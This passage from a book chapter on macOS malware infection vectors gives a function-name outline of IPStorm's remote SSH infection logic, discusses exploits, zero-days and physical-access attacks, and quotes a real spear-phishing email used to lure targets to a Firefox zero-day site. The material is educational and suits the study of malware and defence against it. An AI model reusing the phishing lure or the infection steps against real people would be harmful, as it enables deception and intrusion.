<pre><code>int ssh.InstallPayload(...) {<br/><br/>   ssh.SystemInfo.GoArch(...);<br/><br/><span epub:type="pagebreak" id="Page_18" title="18"/>   statik.GetFileContents(...);<br/><br/>   ssh.(*Session).Start(...);<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing1-8">Listing 1-8</a>: Remote infection logic (IPStorm)</p>
<p>As you can see, IPStorm invokes a method named <code>GoArch</code> in order to gather information about the remote system, such as its architecture. With this information, it can then download a compatible payload via a call to its <code>GetFileContents</code> method. Finally, it executes the payload on the remote system, commencing a persistent infection.</p>
<h2 id="h1-501942c01-0013">Exploits</h2>
<p class="BodyFirst">The majority of macOS injection vectors require a fair amount of user interaction, such as downloading and running a malicious application. Moreover, as noted, recent macOS malware mitigations may now thwart the majority of such attacks. <em>Exploits,</em> on the other hand, are much more insidious, as they can silently install malware, often with no direct user interactions or detections from operating system–level protections. An exploit is code that leverages a vulnerability in order to execute attacker-specified code to, for example, install malware. <em>Zero-day exploits</em> are those that attack vulnerabilities for which no patch currently exists, making them the ultimate infection vector. Even once the vendor has released a patch for a zero-day, users who don’t apply the security update remain vulnerable. Attackers and malware may leverage this fact by targeting unpatched users.</p>
<p>Attackers and malware authors often attempt to uncover or procure vulnerabilities in applications such as browsers and mail or chat clients, in order to weaponize exploits that may be remotely delivered to targets. For example, one of the most prolific Mac malware specimens, Flashback, leveraged an unpatched Java vulnerability to infect over a half million Mac computers.<sup class="endnote"><a href="#c01-endnote-22" id="c01-noteref-22">22</a></sup></p>
<p>More recently, in 2019 hackers used a Firefox zero-day to deploy malware to fully patched macOS systems. The following compelling emails enticed targeted users to visit a malicious site containing the exploit code: </p>
<blockquote class="blockquote">
<p class="Blockquote">Dear XXX,</p>
<p class="Blockquote">My name is Neil Morris. I’m one of the Adams Prize Organizers.</p>
<p class="Blockquote">Each year we update the team of independent specialists who could assess the quality of the competing projects: http://people.ds.cam.ac.uk/nm603/awards/Adams_Prize</p>
<p class="Blockquote">Our colleagues have recommended you as an experienced specialist in this field. We need your assistance in evaluating several projects for Adams Prize.</p>
<p class="Blockquote">Looking forward to receiving your reply.</p>
<p class="Blockquote">Best regards,</p>
<p class="Blockquote">Neil Morris</p></blockquote>
<p><span epub:type="pagebreak" id="Page_19" title="19"/>If the user visited the site via Firefox, a zero-day exploit would silently and persistently install a macOS backdoor.<sup class="endnote"><a href="#c01-endnote-23" id="c01-noteref-23">23</a></sup> Luckily for the average macOS user, the use of zero-day exploits to deploy malware is somewhat uncommon. Still, it would be naive to underestimate the use of such powerful capabilities, especially by sophisticated APT and nation-state hacking groups. And, of course, such exploits are available to anybody willing to pay. <a href="#figure1-13" id="figureanchor1-13">Figure 1-13</a> shows a leaked email, sent to the infamous cyberespionage company HackingTeam, offering exploits targeting Apple systems. </p>
<figure>
<img alt="An email that asks if HackingTeam is interested in buying zero-day vulnerabilities with RCE exploits for Flash Player, Silverlight, Java, and Safari. The email goes on to describe what these exploits do, including bypassing ASLR and DEP-like protection." class="keyline" src="image_fi/501942c01/f01013.png"/>
<figcaption><p><a id="figure1-13">Figure 1-13</a>: Zero-day exploits for sale</p></figcaption>
</figure>
<p>The company ultimately procured the exploit, a Flash zero-day, for $45,000.<sup class="endnote"><a href="#c01-endnote-24" id="c01-noteref-24">24</a></sup> As Apple continues to harden macOS by adding security mechanisms to it, such as application notarization requirements, attackers will largely be forced to abandon inferior user-assisted infection vectors, instead leveraging exploits in order to successfully infect macOS users. </p>
<h2 id="h1-501942c01-0014">Physical Access</h2>
<p class="BodyFirst">So far, all the infection vectors discussed in this chapter are <em>remote</em>, meaning the attacker is not actually present at the system’s location during the attack. There are several upsides to remote attacks. They allow attackers to overcome geographic disparities, as well as scale their attack to infect many targets around the world. Remote attacks also increase the attacker’s stealth, reducing their risk; if they’re careful, it’s unlikely that the attacker will be identified or physically apprehended.</p>
<p>The main downside to remote attacks is that their success is far from guaranteed. When given physical access to a computer, attackers greatly increase their likelihood of achieving a successful infection. To do so, however, they must first gain hands-on access to the target system, as well as accept the increased risk of getting caught red-handed. Also, physical attacks still often require exploits. Though the average hacker may not possess the resources, nor be willing to accept the risks of physical access attacks, nation-state hackers, who often chase specific high-value targets, have been known to pull them off. For example, in an article titled “WikiLeaks Reveals How the CIA Can Hack Mac’s Hidden Code,” <em>Wired</em> notes:</p>
<blockquote class="review">
<p class="Blockquote">If the CIA wants inside your Mac, it may not be enough that you so carefully avoided those infected email attachments or maliciously <span epub:type="pagebreak" id="Page_20" title="20"/>crafted web sites designed to plant spyware on your machine . . . if Langley’s hackers got physical access, they still could have infected the deepest, most hidden recesses of your laptop.<sup class="endnote"><a href="#c01-endnote-25" id="c01-noteref-25">25</a></sup></p></blockquote>
<p>The leaked government documents mentioned in the article discuss the agency’s capabilities and use of <em>Extensible Firmware Interface (EFI) exploits</em>, which target vulnerabilities in pre-operating system bootup code. The payloads they install are notoriously difficult to both detect and remove. Moreover, as the exploited vulnerabilities may exist in read-only memory, they may be impossible to fix with software-based patches. For more details on EFI and bootloader attacks, see “BootBandit: A macOS bootloader attack.”<sup class="endnote"><a href="#c01-endnote-26" id="c01-noteref-26">26</a></sup> </p>
<p>Of course, these low-level EFI-based exploits aren’t the only option for an attacker with physical access to a Mac. A local attacker could exploit vulnerabilities, for example in the USB stack, even if the target Mac is locked. Case in point: older versions of Apple’s desktop operating system contain a reliably exploitable USB flaw. Attackers can trigger this non-public vulnerability by simply inserting a USB device, even if the target is in a locked state. Moreover, as the vulnerable code runs with root privileges, a successful exploitation can lead to complete system compromise via the installation of persistent malware.</p>
<p>More recently, the infamous Checkm8 vulnerability, well known for being able to jailbreak iPhones, was found to also impact Apple’s non-mobile devices too, such as Macs and MacBooks with T2 chips. When given physical access to a target system, attackers could abuse this flaw to infect a macOS system.<sup class="endnote"><a href="#c01-endnote-27" id="c01-noteref-27">27</a></sup> </p>
<h2 id="h1-501942c01-0015">Up Next</h2>
<p class="BodyFirst">You should now have a solid understanding of how malicious software can infect macOS systems. What does malware do once it has infected a system? More often than not, it will persistently install itself. In <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span> we’ll turn our attention to the various methods of persistence.</p>
<h2 id="h1-501942c01-0016">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-1" id="c01-endnote-1">	1</a></sup>	 Patrick Wardle, “Gatekeeper Exposed,” January 17, 2016, <a class="LinkURL" href="https://speakerdeck.com/patrickwardle/shmoocon-2016-gatekeeper-exposed-come-see-conquer/">https://speakerdeck.com/patrickwardle/shmoocon-2016-gatekeeper-exposed-come-see-conquer/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-2" id="c01-endnote-2">	2</a></sup>	 “Notarizing macOS Software Before Distribution,” <em>Apple Developer Documentation</em>, <a class="LinkURL" href="https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution/">https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution/</a>. </p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-3" id="c01-endnote-3">	3</a></sup>	 Mike Peterson, “New Mac malware uses ‘novel’ tactic to bypass macOS Catalina security,” <em>AppleInsider</em>, June 18, 2020, <a class="LinkURL" href="https://appleinsider.com/articles/20/06/18/new-mac-malware-uses-novel-tactic-to-bypass-macos-catalina-security/">https://appleinsider.com/articles/20/06/18/new-mac-malware-uses-novel-tactic-to-bypass-macos-catalina-security/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><span epub:type="pagebreak" id="Page_21" title="21"/><sup class="endnote"><a href="#c01-noteref-4" id="c01-endnote-4">	4</a></sup>	 Patrick Wardle, “Apple Approved Malware: Malicious Code . . . Now Notarized!?” <em>Objective-See</em>, August 30, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x4E.html">https://objective-see.com/blog/blog_0x4E.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-5" id="c01-endnote-5">	5</a></sup>	 Patrick Wardle, “All Your Macs Are Belong To Us: bypassing macOS’s file quarantine, gatekeeper, and notarization requirements,” <em>Objective-See</em>, April 26, 2021, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x64.html">https://objective-see.com/blog/blog_0x64.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-6" id="c01-endnote-6">	6</a></sup>	 Ofer Caspi, “OSX Malware is Catching Up, and it wants to Read Your HTTPS Traffic,” <em>Check Point Blog</em>, April 27, 2017, <a class="LinkURL" href="https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/">https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-7" id="c01-endnote-7">	7</a></sup>	 “About the Web Browser Pop-up Alert Scam,” <em>Intego Support</em>, April 16, 2021, <a class="LinkURL" href="https://support.intego.com/hc/en-us/articles/207113578-About-the-Web-Browser-Pop-up-Alert-Scam/">https://support.intego.com/hc/en-us/articles/207113578-About-the-Web-Browser-Pop-up-Alert-Scam/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-8" id="c01-endnote-8">	8</a></sup>	 “OSX.Siggen” in Patrick Wardle, “The Mac Malware of 2019,” <em>Objective-See</em>, January 1, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html#osx-siggen">https://objective-see.com/blog/blog_0x53.html#osx-siggen</a>. </p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-9" id="c01-endnote-9">	9</a></sup>	 @phishingAI, “@WhatsApp #phishing/drive-by-download domain,” <em>Twitter</em>, April 25, 2019, <a class="LinkURL" href="https://twitter.com/PhishingAi/status/1121409348184313856/">https://twitter.com/PhishingAi/status/1121409348184313856/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-10" id="c01-endnote-10">	10</a></sup>	 Patrick Wardle, “Pass the AppleJeus: a mac backdoor written by the infamous lazarus apt group,” <em>Objective-See</em>, October 12, 2019, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x49.html">https://objective-see.com/blog/blog_0x49.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-11" id="c01-endnote-11">	11</a></sup>	 Patrick Wardle, “Invading the core: iWorm’s infection vector and persistence mechanism,” <em>Virus Bulletin</em>, October 2014, <a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf">https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-12" id="c01-endnote-12">	12</a></sup>	 Thomas Reed, “New Mac cryptominer Malwarebytes detects as Bird Miner runs by emulating Linux,” <em>Malwarebytes Labs</em>, June 20, 2019, <a class="LinkURL" href="https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/">https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-13" id="c01-endnote-13">	13</a></sup>	 Michel Malik, “LoudMiner: Cross-platform mining in cracked VST software,” <em>WeLiveSecurity</em>, June 20, 2019, <a class="LinkURL" href="https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/">https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-14" id="c01-endnote-14">	14</a></sup>	 Taha K., “In the Trails of WindShift APT,” <a class="LinkURL" href="https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf">https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf</a>; Patrick Wardle, “Middle East Cyber-Espionage: Analyzing WindShift’s implant: OSX.WindTail,” <em>Objective-See</em>, December 20, 2018, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x3B.html">https://objective-see.com/blog/blog_0x3B.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-15" id="c01-endnote-15">	15</a></sup>	 See “OSX.Yort” in Patrick Wardle, “The Mac Malware of 2019,” <em>Objective-See</em>, January 1, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html#osx-yort">https://objective-see.com/blog/blog_0x53.html#osx-yort</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-16" id="c01-endnote-16">	16</a></sup>	 Patrick Wardle, “Documents of Doom: Infecting macOS via Office Macros,” <em>Objective-See</em>, <a class="LinkURL" href="https://objectivebythesea.com/v3/talks/OBTS_v3_pWardle.pdf">https://objectivebythesea.com/v3/talks/OBTS_v3_pWardle.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><span epub:type="pagebreak" id="Page_22" title="22"/><sup class="endnote"><a href="#c01-noteref-17" id="c01-endnote-17">	17</a></sup>	 Trend Micro Research, “The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSS Backdoor Planting in Safari, and Leverages Two Zero-day Exploits,” 2020, <a class="LinkURL" href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf">https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-18" id="c01-endnote-18">	18</a></sup>	 Patrick Wardle, “HandBrake Hacked! OSX/Proton (re)appears,” <em>Objective-See</em>, June 5, 2017, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x1D.html">https://objective-see.com/blog/blog_0x1D.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-19" id="c01-endnote-19">	19</a></sup>	 Patrick Wardle, “Analyzing OSX/CreativeUpdater: a macOS cryptominer, distributed via macupdate.com,” <em>Objective-See</em>, May 2, 2018, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x29.html">https://objective-see.com/blog/blog_0x29.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-20" id="c01-endnote-20">	20</a></sup>	 “Flash March Mc000091 Mw,” <em>Scribd</em>, March 5, 2018, <a class="LinkURL" href="https://www.scribd.com/document/389668224/Flash-March-Mc000091-Mw/">https://www.scribd.com/document/389668224/Flash-March-Mc000091-Mw/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-21" id="c01-endnote-21">	21</a></sup>	 Nicole Fishbein and Avigayil Mechtinger, “A Storm is Brewing: IPStorm Now Has Linux Malware,” <em>Intezer</em>, October 1, 2020, <a class="LinkURL" href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/</a>; “IPStorm” in Patrick Wardle, “The Mac Malware of 2020,” <em>Objective-See</em>, January 1, 2021, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x5F.html#-ipstorm">https://objective-see.com/blog/blog_0x5F.html#-ipstorm</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-22" id="c01-endnote-22">	22</a></sup>	 Broderick Ian Aquilino, “Flashback OS X Malware,” <em>Virus Bulletin Conference</em>, September 2012, <a class="LinkURL" href="https://archive.f-secure.com/weblog/archives/Aquilino-VB2012.pdf">https://archive.f-secure.com/weblog/archives/Aquilino-VB2012.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-23" id="c01-endnote-23">	23</a></sup>	 Patrick Wardle, “Burned by Fire(fox),” <em>Objective-See</em>, June 20, 2019, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x43.html">https://objective-see.com/blog/blog_0x43.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-24" id="c01-endnote-24">	24</a></sup>	 Cyrus Farivar, “How a Russian hacker made $45,000 selling a 0-day Flash exploit to Hacking Team,” <em>Ars Technica</em>, October 7, 2015, <a class="LinkURL" href="https://arstechnica.com/information-technology/2015/07/how-a-russian-hacker-made-45000-selling-a-zero-day-flash-exploit-to-hacking-team/">https://arstechnica.com/information-technology/2015/07/how-a-russian-hacker-made-45000-selling-a-zero-day-flash-exploit-to-hacking-team/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-25" id="c01-endnote-25">	25</a></sup>	 Andy Greenberg, “WikiLeaks Reveals How the CIA Can Hack a Mac’s Hidden Code,” <em>Wired</em>, March 23, 2017, <a class="LinkURL" href="https://www.wired.com/2017/03/wikileaks-shows-cia-can-hack-macs-hidden-code/">https://www.wired.com/2017/03/wikileaks-shows-cia-can-hack-macs-hidden-code/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-26" id="c01-endnote-26">	26</a></sup>	 Armen Boursalian and Mark Stamp, “BootBandit: A macOS bootloader attack,” <em>Wiley Online Library</em>, August 19, 2019, <a class="LinkURL" href="https://onlinelibrary.wiley.com/doi/full/10.1002/eng2.12032/">https://onlinelibrary.wiley.com/doi/full/10.1002/eng2.12032/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#c01-noteref-27" id="c01-endnote-27">	27</a></sup>	 Lily Hay Newman, “Apple’s T2 security chip has an unfixable flaw,” <em>Ars Technica</em>, October 10, 2020, <a class="LinkURL" href="https://arstechnica.com/information-technology/2020/10/apples-t2-security-chip-has-an-unfixable-flaw/">https://arstechnica.com/information-technology/2020/10/apples-t2-security-chip-has-an-unfixable-flaw/</a>.</p></aside>
</section>
</body>
</html>